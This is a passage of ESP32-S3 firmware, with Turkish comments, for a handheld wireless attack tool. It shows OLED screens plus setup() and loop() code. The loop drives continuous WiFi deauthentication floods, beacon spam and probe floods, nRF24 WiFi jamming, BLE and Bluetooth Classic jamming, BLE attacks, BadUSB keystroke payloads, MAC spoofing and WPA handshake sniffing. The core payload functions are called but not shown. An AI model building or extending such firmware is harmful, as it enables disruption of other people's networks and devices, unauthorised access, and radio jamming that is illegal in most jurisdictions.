  for (int i=0;i<apCount;i++) {
    if (apList[i].selected) { snprintf(r1,22,">%.18s",apList[i].ssid); break; }
  }
  display.setCursor(0,11); display.print(r1);
  // Row 2: Sent + sıcaklık
  char r2[22];
  snprintf(r2,22,"Sent:%-6lu %3.0fC",(unsigned long)pktSent,(double)chipTempC);
  display.setCursor(0,22); display.print(r2);
  // Row 3: Targets
  char r3[22]; snprintf(r3,22,"Targets:%dAP %dST",selectedApCount(),selectedStaCount());
  display.setCursor(0,33); display.print(r3);
  display.setCursor(0,44);
  if (thermalThrottle) {
    display.print(F("** ISIYA KORUMA **"));
  } else if (dualRadioActive) {
    display.print(F("[DUAL] nRF+DEAUTH"));
  } else if (nrfWifiJamActive) {
    display.print(F("[JAMMER] nRF ON"));
  } else {
    display.print(F("[STOP]"));
  }
  // Row 5: nRF jam durum
  if (nrfWifiJamActive) {
    display.setCursor(0,54);
    char nrfBuf[22];
    snprintf(nrfBuf, 22, "nRF JAM ch%d ON", (int)currentChannel);
    display.print(nrfBuf);
  }
  safeDisplayFlush();
}

void drawPacketMonitor() {
  display.clearDisplay();
  // Header
  char hdr[24];
  snprintf(hdr,24,"CH:%2d [D:%lu] %lu/s",
    currentChannel,
    (unsigned long)deauthCount,
    (unsigned long)pktPerSec);
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.print(hdr);
  // Bar graph
  // Find max in ring
  uint16_t maxVal=1;
  for (int x=0;x<PKT_RING;x++) if (packetRing[x]>maxVal) maxVal=packetRing[x];
  for (int x=0;x<128;x++) {
    int ri = (pktHead + x) % PKT_RING;
    int h = (int)((long)packetRing[ri]*54/maxVal);
    if (h>54) h=54;
    if (h>0) display.drawLine(x,63,x,63-h,SSD1306_WHITE);
  }
  safeDisplayFlush();
}

void drawChannelAnalyzer() {
  display.clearDisplay();
  drawHeader("CH Analyzer");
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  if (!chScanDone) {
    display.setCursor(0,20);
    char buf[20]; snprintf(buf,20,"Scanning CH %d...",chScanState+1);
    display.print(buf);
    safeDisplayFlush();
    return;
  }
  uint8_t maxAP=1;
  for (int i=0;i<13;i++) if (chApCount[i]>maxAP) maxAP=chApCount[i];
  // Show channels 1-7 in top half, 8-13 bottom half (fit 13 rows in 54px)
  for (int ch=1;ch<=13;ch++) {
    int y=9+(ch-1)*4;
    if (y>60) break;
    int bw = chApCount[ch-1] * 100 / (maxAP?maxAP:1);
    display.drawLine(0,y,bw,y,SSD1306_WHITE);
    char num[3]; snprintf(num,3,"%2d",ch);
    display.setCursor(108,y-1); display.print(num);
  }
  // Best/Busy
  uint8_t bestCh=1, busyCh=1;
  for (int i=0;i<13;i++) {
    if (chApCount[i]<chApCount[bestCh-1]) bestCh=i+1;
    if (chApCount[i]>chApCount[busyCh-1]) busyCh=i+1;
  }
  char bstr[22];
  snprintf(bstr,22,"Best:CH%d Busy:CH%d",bestCh,busyCh);
  display.setCursor(0,57); display.print(bstr);
  safeDisplayFlush();
}

void drawRssiTracker() {
  int selAp=-1;
  for (int i=0;i<apCount;i++) if (apList[i].selected) { selAp=i; break; }
  display.clearDisplay();
  if (selAp<0) {
    drawFullscreenMsg("RSSI","Select AP");
    return;
  }
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  char hdr[24];
  snprintf(hdr,24,"%.13s %d",apList[selAp].ssid, apList[selAp].rssi);
  display.setCursor(0,0); display.print(hdr);

  // Compute min/max/avg
  int8_t rmin=-30, rmax=-100;
  int32_t rsum=0; int rcnt=0;
  for (int i=0;i<RSSI_RING;i++) {
    if (rssiRing[i]!=0) {
      if (rssiRing[i]<rmin) rmin=rssiRing[i];
      if (rssiRing[i]>rmax) rmax=rssiRing[i];
      rsum+=rssiRing[i]; rcnt++;
    }
  }
  int8_t ravg=(rcnt>0)?(int8_t)(rsum/rcnt):-70;
  char stats[24];
  snprintf(stats,24,"Mn:%d Mx:%d Av:%d",rmin,rmax,ravg);
  display.setCursor(0,55); display.print(stats);

  // Graph
  int range = rmin==rmax ? 1 : (rmax-rmin);
  for (int x=0;x<128;x++) {
    int ri=(rssiHead+x)%RSSI_RING;
    int8_t r=rssiRing[ri];
    if (r==0) continue;
    int h=(int)((long)(r-rmin)*44/range);
    if (h<0) h=0; if (h>44) h=44;
    display.drawPixel(x, 53-h, SSD1306_WHITE);
  }
  // Distance estimate
  float rssiRef=-40.0f, n=2.7f;
  float d=pow(10.0f,((rssiRef-(float)ravg)/(10.0f*n)));
  char dist[16]; snprintf(dist,16,"~%dm",(int)d);
  display.setCursor(100,55); display.print(dist);
  safeDisplayFlush();
}

void drawHandshakeStatus() {
  display.clearDisplay();
  drawHeader("HANDSHAKE SNIFF");
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,10);
  display.print(hsSniffActive ? F("Status: ACTIVE") : F("Status: IDLE"));
  display.setCursor(0,20);
  if (hsCount>0) {
    HandshakeRecord &hs=hsList[0];
    char buf[22];
    snprintf(buf,22,"%.13s %d/4",hs.ssid,hs.step);
    display.setCursor(0,32); display.print(buf);
    if (hs.step>=4) {
      display.setCursor(0,44);
    }
  }
  safeDisplayFlush();
}

void drawDeauthDetector() {
  display.clearDisplay();
  drawHeader("DEAUTH DETECT");
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  char buf[22];
  snprintf(buf,22,"Total: %lu",(unsigned long)deauthCount);
  display.setCursor(0,12); display.print(buf);
  if (deauthDetected) {
    display.setTextSize(2);
    display.setCursor(0,28);
    display.print(F("!!DEAUTH!!"));
    display.setTextSize(1);
    char mac[18]; macToStr(deauthSrcMac,mac);
    display.setCursor(0,50); display.print(mac);
  } else {
    display.setCursor(0,28);
    display.print(F("Monitoring..."));
  }
  safeDisplayFlush();
}

void drawClock() {
  display.clearDisplay();
  
  char timeStr[9], dateStr[16];
  getTimeFullStr(timeStr, sizeof(timeStr), dateStr, sizeof(dateStr));
  
  // 1. Canlı Dijital Saat: HH:MM:SS
  drawStrRAM(16, 14, timeStr, 2);

  // 2. Tarih: DD.MM.YYYY
  drawStrRAM(34, 34, dateStr, 1);

  // 3. Bölge Bilgisi
  drawStrRAM(7, 45, "TRT (UTC+3) TURKIYE", 1);

  // 4. Tuş Kılavuzu
  drawStrRAM(0, 56, "UP:+1H DN:+1M SEL:BLE", 1);

  safeDisplayFlush();
}

void drawMacSpoofer() {
  display.clearDisplay();
  drawHeader("MAC SPOOFER");
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  char mac[18];
  macToStr(origMac,mac);
  display.setCursor(0,10); display.print(F("Orig:"));
  display.setCursor(0,18); display.print(mac);
  macToStr(activeMac,mac);
  display.setCursor(0,30); display.print(F("Active:"));
  display.setCursor(0,38); display.print(mac);
  display.setCursor(0,52); display.print(F("SELECT: cycle spoof"));
  safeDisplayFlush();
}

void drawTxRate() {
  display.clearDisplay();
  drawHeader("TX RATE");
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  for (int i=0;i<4;i++) {
    display.setCursor(0,12+i*12);
    display.print(i==txRateIdx?'>'  :' ');
    char buf[12]; snprintf(buf,12," %d pkt/s",txRateOptions[i]);
    display.print(buf);
  }
  display.setCursor(0,57); display.print(F("UP/DN:select SEL:ok"));
  safeDisplayFlush();
}

void drawChannelSet() {
  display.clearDisplay();
  drawHeader("CHANNEL");
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  char buf[4]; snprintf(buf,4,"%2d",currentChannel);
  display.setCursor(52,22); display.print(buf);
  display.setTextSize(1);
  display.setCursor(0,54); display.print(F("UP/DN: change  SEL:ok"));
  safeDisplayFlush();
}

void drawSystemInfo() {
  display.clearDisplay();
  drawHeader("SYSTEM INFO");
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  char buf[24];
  esp_chip_info_t ci; esp_chip_info(&ci);
  snprintf(buf,24,"Chip:ESP32-S3 r%d",ci.revision);
  display.setCursor(0,10); display.print(buf);
  snprintf(buf,24,"CPU: %dMHz",(int)getCpuFrequencyMhz());
  display.setCursor(0,20); display.print(buf);
  snprintf(buf,24,"Heap:%dK/%dK",(int)(ESP.getFreeHeap()/1024),(int)(ESP.getHeapSize()/1024));
  display.setCursor(0,30); display.print(buf);
  if (psramFound()) {
    snprintf(buf,24,"PSRAM:%dK/%dK",(int)(ESP.getFreePsram()/1024),(int)(ESP.getPsramSize()/1024));
    display.setCursor(0,40); display.print(buf);
  }
  // Sıcaklık + termal durum
  snprintf(buf,24,"Temp:%.1fC%s",(double)chipTempC, thermalThrottle?" [HOT]":"");
  display.setCursor(0,50); display.print(buf);
  safeDisplayFlush();
}

// ============================================================
// BadUSB Menu Builder
// ============================================================
void buildBadusbMenu() {
  menuCount = 0;
  for (int i = 0; i < BADUSB_COUNT; i++) {
    setMenu(menuCount++, BADUSB_NAMES[i], MODE_BADUSB_MENU, i);
  }
  menuCursor = 0; menuScroll = 0;
}

// ============================================================
// BadUSB OLED Ekranı — Menü
// ============================================================
void drawBadusbMenu() {
  display.clearDisplay();
  drawHeader("BAD USB");
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  // USB bağlantı durumu
  display.setCursor(80, 0);
  display.print(usbHIDReady ? F("USB:OK") : F("USB:--"));

  int rows = min(MENU_ROWS, menuCount - menuScroll);
  for (int i = 0; i < rows; i++) {
    int idx = menuScroll + i;
    int y = 10 + i * 11;
    display.setCursor(0, y);
    display.print(idx == menuCursor ? '>' : ' ');
    display.print(' ');
    display.print(menuItems[idx].label);
  }
  // Scrollbar
  if (menuCount > MENU_ROWS) {
    int barH = (MENU_ROWS * 54) / menuCount;
    int barY = 10 + (menuScroll * 54) / menuCount;
    display.drawFastVLine(127, 10, 54, SSD1306_WHITE);
    display.fillRect(126, barY, 2, barH, SSD1306_WHITE);
  }
  display.setCursor(0, 57);
  display.print(F("SEL:run  HOLD-UP:back"));
  safeDisplayFlush();
}

// ============================================================
// BadUSB OLED Ekranı — Çalışıyor
// ============================================================
void drawBadusbRunning() {
  display.clearDisplay();
  drawHeader("BAD USB");
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  if (badusbPayload >= 0 && badusbPayload < BADUSB_COUNT) {
    display.setCursor(0, 10);
    display.print(F("Payload:"));
    display.setCursor(0, 20);
    display.print(BADUSB_NAMES[badusbPayload]);
  }

  display.setCursor(0, 34);
  if (badusbRunning) {
    // Animasyonlu nokta
    static uint8_t dots = 0;
    static uint32_t dotTimer = 0;
    if (millis() - dotTimer > 400) { dots = (dots + 1) % 4; dotTimer = millis(); }
    display.print(F("Running"));
    for (uint8_t d = 0; d < dots; d++) display.print('.');
  } else {
    display.print(badusbStatus);
  }

  if (!usbHIDReady) {
    display.setCursor(0, 46);
    display.print(F("!! USB NOT READY !!"));
  }

  display.setCursor(0, 57);
  display.print(F("HOLD-UP: stop/back"));
  safeDisplayFlush();
}

// ============================================================
// setup()
// ============================================================
void dbgShow(const char* msg) {
  display.clearDisplay();
  display.setCursor(0, 20);
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  display.print(msg);
  display.display();
  delay(800);
}

void setup() {
  Serial.begin(115200);
  delay(500);
  Serial.println("\n\n=== BOOT START ==="); Serial.flush();

  Serial.println("S1: loadSettings"); Serial.flush();
  loadSettings();

  Serial.println("S2: Wire.begin"); Serial.flush();
  Wire.begin(OLED_SDA, OLED_SCL);
  Wire.setClock(400000);

  Serial.println("S3: display.begin"); Serial.flush();
  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    Serial.println("OLED FAIL"); Serial.flush();
    while (true) delay(1000);
  }
  Serial.println("S4: display clear"); Serial.flush();
  display.clearDisplay();
  display.display();
  display.setTextColor(SSD1306_WHITE);

  pinMode(BTN_UP,     INPUT_PULLUP);
  pinMode(BTN_DOWN,   INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);

  Serial.println("S5: initPSRAM"); Serial.flush();
  initPSRAM();

  Serial.println("S6: initNRF"); Serial.flush();
  pinMode(NRF_CE,  OUTPUT);
  pinMode(NRF_CSN, OUTPUT);
  digitalWrite(NRF_CE,  LOW);
  digitalWrite(NRF_CSN, HIGH);
  initNRF();

  Serial.println("S7: WiFi.mode"); Serial.flush();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(50);
  esp_wifi_start();
  esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
  esp_wifi_set_promiscuous(false);

  Serial.println("S8: MAC/Clock"); Serial.flush();
  esp_wifi_get_mac(WIFI_IF_STA, origMac);
  memcpy(activeMac, origMac, 6);
  initTurkeyClock();

  esp01Active = false;
  if (esp01UseDeauth) {
    esp01Init();
  }
  usbHIDReady = false;

  buildMainMenu();

  Serial.println("S9: drawIntro"); Serial.flush();
  introTimer = millis();
  appMode = MODE_INTRO;
  drawIntro();
  Serial.println("=== SETUP COMPLETE ==="); Serial.flush();
}

#define THERMAL_TEMP_EMERGENCY_C  85.0f

void updateThermal() {
  uint32_t now = millis();
  if (now - thermalSampleTimer < THERMAL_SAMPLE_MS) return;
  thermalSampleTimer = now;

  // ESP32-S3 dahili sıcaklık okuma — varsayılan değer filtrelemesi
  float temp = temperatureRead();
  if (isnan(temp) || temp < 5.0f || temp > 110.0f) {
    chipTempC = 35.0f;  // Donanım sensörü okunamazsa güvenli varsayılan
  } else {
    chipTempC = temp;
  }

  if (!thermalThrottle && chipTempC >= THERMAL_TEMP_STOP_C) {
    thermalThrottle = true;
    if (nrfInitDone) {
      nrfRadio.flush_tx();
      nrfRadio.powerDown();
    }
  } else if (thermalThrottle && chipTempC <= THERMAL_TEMP_RESUME_C) {
    thermalThrottle = false;
    if (nrfInitDone && (bleJamming || btClassicJamActive || nrfWifiJamActive)) {
      nrfRadio.powerUp();
      delay(5);
    }
  }

  // ACİL DURUM: 85°C üstünde WiFi TX kapatılır
  if (chipTempC >= THERMAL_TEMP_EMERGENCY_C) {
    if (attackRunning) {
      attackRunning = false;
      WiFi.mode(WIFI_STA);
      esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
      esp_wifi_set_promiscuous(false);
    }
  }
}

// ============================================================
// loop()
// ============================================================
void loop() {
  uint32_t now = millis();

  // ESP-01 non-blocking scan poll — scan 2.2sn sonra tamamlanır,
  // her tick'te kontrol ederek UI'ı bloklamadan sonucu alırız.
  if (esp01Active && esp01ScanPending) {
    esp01PollScan();
  }

  // Frame rate limiter for display
  bool doFrame = (now - frameTimer >= FRAME_MS);
  if (doFrame) frameTimer = now;

  // ---- Intro ----
  if (appMode == MODE_INTRO) {
    if (now - introTimer >= INTRO_MS) {
      changeMode(MODE_MENU);
    }
    if (doFrame) drawIntro();
    taskYIELD();
    return;
  }

  // ---- Scanning mode ----
  if (appMode == MODE_SCANNING) {
    if (doFrame) drawScanning();
    if (scanMode != SCAN_STA_ONLY) {
      doWifiScan();
    }
    if (scanMode != SCAN_AP_ONLY) {
      // Fix #2: STA-only modda promiscuous açılıp hemen kapatılıyordu — hiç station yakalanamıyordu.
      // 3 saniyelik pencere aç, data frame'leri topla, sonra devam et.
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb(promisc_cb);
      uint32_t scanEnd = millis() + 3000;
      while (millis() < scanEnd) {
        // defer ring drain — parsePromisc burada çağrılır
        while (promRing[promReadIdx].ready) {
          PromFrame& f = promRing[promReadIdx];
          parsePromisc(f.data, f.len, f.rssi);
          f.ready = false;
          promReadIdx = (promReadIdx + 1) % PROM_RING_SIZE;
        }
        if (doFrame) drawScanning();
        delay(10);
      }
      esp_wifi_set_promiscuous(false);
    }
    changeMode(MODE_AP_LIST);
    taskYIELD();
    return;
  }

  // ---- Buttons ----
  Serial.print("L: BTNS "); Serial.flush();
  BtnEvent eu  = processBtn(btnUp,   BTN_UP);
  BtnEvent ed  = processBtn(btnDown, BTN_DOWN);
  BtnEvent esel= processBtn(btnSel,  BTN_SELECT);

  if (eu.click || eu.repeat)   handleUp();
  if (ed.click || ed.repeat)   handleDown();
  if (esel.click)              handleSelect();
  if (esel.held && !esel.repeat) {
    // Long press SELECT on AP list → show detail
    if (appMode == MODE_AP_LIST && menuCursor < apCount) {
      detailIdx = menuCursor;
      changeMode(MODE_AP_DETAIL);
    }
  }
  if (eu.held && !eu.repeat)   goBack();

  // ---- Packet rate calc ----
  Serial.print("L: PKT "); Serial.flush();
  if (now - lastPktSample >= 1000) {
    uint32_t cur = pktCount;
    pktPerSec = cur - lastPktVal;
    lastPktVal = cur;
    // Push to ring
    packetRing[pktHead] = (uint16_t)(pktPerSec > 65535 ? 65535 : pktPerSec);
    pktHead = (pktHead+1)%PKT_RING;
    lastPktSample = now;
  }

  // ---- Thermal management ----
  Serial.print("L: TH "); Serial.flush();
  updateThermal();

  // ---- Promiscuous defer ring drain — fix #5 ----
  // promisc_cb'den ISR dışına ertelenmiş frame'leri burada işle.
  // parsePromisc/checkHandshake ISR güvenli değil, loop()'ta çalışır.
  Serial.print("L: DR "); Serial.flush();
  {
    int drained = 0;
    while (promRing[promReadIdx].ready && drained < PROM_RING_SIZE) {
      PromFrame& f = promRing[promReadIdx];
      parsePromisc(f.data, f.len, f.rssi);
      f.ready = false;
      promReadIdx = (promReadIdx + 1) % PROM_RING_SIZE;
      drained++;
    }
  }

  // ---- dualRadioActive senkronizasyonu ----
  // Yalnızca ESP32-S3 Deauth (ATK_DEAUTH) VE nRF24 Jammer BİRLİKTE aktifse dualRadioActive true olur
  dualRadioActive = (attackRunning && (attackFlags & ATK_DEAUTH) && nrfWifiJamActive);

  // ---- ESP-01 Scan Poll ----
  if (esp01Active && esp01ScanPending) {
    esp01PollScan();
  }

  // ---- Attack engine ----
  if (attackRunning) {
    // DEAUTH: Limitsiz — her loop iterasyonunda çağrılır.
    if (attackFlags & ATK_DEAUTH) sendDeauthFrames();
    else if (esp01UseDeauth && esp01Active) {
      // Sadece ESP-01 Deauth seçildiyse: ESP32-S3 deauth atmadan doğrudan ESP-01'e gönder
      for (int a = 0; a < apCount; a++) {
        if (apList[a].selected) {
          esp01SendDeauth(apList[a].bssid, apList[a].channel, apList[a].ssid);
        }
      }
    }

    // BEACON/PROBE: txRateOptions ile sınırlı (aşırı kanal meşgul olmasın)
    int baseInterval = 1000 / txRateOptions[txRateIdx];
    int interval = dualRadioActive ? (baseInterval * 2) : baseInterval;
    if (now - lastTxTime >= (uint32_t)interval) {
      lastTxTime = now;
      if (attackFlags & ATK_BEACON) beaconSpam();
      if (attackFlags & ATK_PROBE)  probeFlood();
    }
    // Dual modda cooling — nRF ve WiFi birlikte çalışınca RF ısısı artar
    if (dualRadioActive) delay(2);
  }
  // nRF24 WiFi kanal jam — attackRunning'den bağımsız, her zaman çalışır
  if (nrfWifiJamActive) nrfWifiJamTick();

  // ---- Channel Analyzer ----
  if (appMode == MODE_CHANNEL_ANALYZER) runChannelAnalyzer();

  // ---- RSSI Tracker ----
  if (appMode == MODE_RSSI_TRACKER) updateRssiTracker();

  // ---- BadUSB Engine ----
  if (appMode == MODE_BADUSB_RUNNING && badusbRunning) {
    badusbRunning = false;
    // WiFi'ı geçici olarak durdur (USB kararlılığı için)
    esp_wifi_set_promiscuous(false);
    badusb_run(badusbPayload);
    strlcpy(badusbStatus, "Tamamlandi!", 32);
  }

  // ---- BLE Attack Engine ----
  if (appMode == MODE_BLE_RUNNING && bleAttacking) {
    bleAttackTick();
  }

  // ---- BLE Jammer Engine ----
  if (appMode == MODE_BLE_JAM && bleJamming) {
    bleJamTick();
  }

  // ---- BT Classic Spectrum Jam Engine ----
  if (appMode == MODE_BT_CLASSIC_JAM && btClassicJamActive) {
    btClassicJamTick();
  }

  // ---- Deauth detector reset ----
  if (deauthDetected && (now - deauthFlashTimer >= 3000)) {
    deauthDetected = false;
  }
  if (deauthDetected && deauthFlashTimer==0) deauthFlashTimer=now;
  if (!deauthDetected) deauthFlashTimer=0;

  // ---- OLED Draw ----
  if (!doFrame) { taskYIELD(); return; }

  Serial.print("L: SW "); Serial.flush();
  switch (appMode) {
    case MODE_MENU:        drawMenu();            break;
    case MODE_ATTACK_MENU: drawMenu();            break;
    case MODE_JAMMERS_MENU: drawMenu();           break;
    case MODE_SETTINGS:    drawMenu();            break;
    case MODE_AP_LIST:     drawAPList();          break;
    case MODE_STA_LIST:    drawStaList();         break;
    case MODE_PROBE_LIST:  drawProbeList();       break;
    case MODE_SSID_LIST:   drawSSIDList();        break;
    case MODE_AP_DETAIL:   drawAPDetail();        break;
    case MODE_ATTACK_RUNNING: drawAttackRunning();break;
    case MODE_PACKET_MONITOR: drawPacketMonitor();break;
    case MODE_CHANNEL_ANALYZER: drawChannelAnalyzer(); break;
    case MODE_RSSI_TRACKER: drawRssiTracker();    break;
    case MODE_HANDSHAKE_STATUS: drawHandshakeStatus(); break;
    case MODE_DEAUTH_DETECTOR:  drawDeauthDetector();  break;
    case MODE_CLOCK:       drawClock();           break;
    case MODE_MAC_SPOOFER: drawMacSpoofer();      break;
    case MODE_TX_RATE:     drawTxRate();          break;
    case MODE_CHANNEL_SET: drawChannelSet();      break;
    case MODE_SYSTEM_INFO:   drawSystemInfo();      break;
    case MODE_BADUSB_MENU:   drawBadusbMenu();      break;
    case MODE_BADUSB_RUNNING: drawBadusbRunning();  break;
    case MODE_BLE_MENU:      drawMenu();            break;
    case MODE_BLE_SCAN:      drawBLEScan();         break;
    case MODE_BLE_DEV_ATTACK: drawBLEDevAttack();   break;
    case MODE_BLE_RUNNING:   drawBLERunning();      break;
    case MODE_BLE_JAM:          drawBLEJam();          break;
    case MODE_BT_CLASSIC_JAM:  drawBTClassicJam();    break;
    default: break;
  }

  delay(1);   // CPU'ya idle fırsatı, modem sleep aktif
}

